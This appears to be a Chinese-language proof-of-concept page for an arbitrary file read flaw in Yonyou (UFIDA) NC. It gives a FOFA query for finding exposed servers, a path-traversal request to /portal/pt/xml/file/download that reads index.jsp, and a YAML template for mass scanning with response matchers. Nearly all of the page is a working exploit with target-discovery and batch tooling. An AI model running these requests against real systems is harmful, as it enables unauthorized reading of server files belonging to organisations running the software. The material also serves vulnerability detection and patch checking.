
## 用友NC的download文件存在任意文件读取漏洞


## fofa
```
app="用友-UFIDA-NC"
```

## poc
```
/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp
```
![image](https://github.com/wy876/POC/assets/139549762/43853ad7-9323-4874-956c-25b5de054184)

## yaml 批量检测
```
id: yonyouNC_download_fileread
info:
  name: 用友NC_download文件读取
  author: mhb17
  severity: high
  description: description
  reference:
    - https://
  tags: fileread
requests:
  - raw:
      - |+
        GET /portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: word
        part: body
        words:
          - "response.addHeader"

```
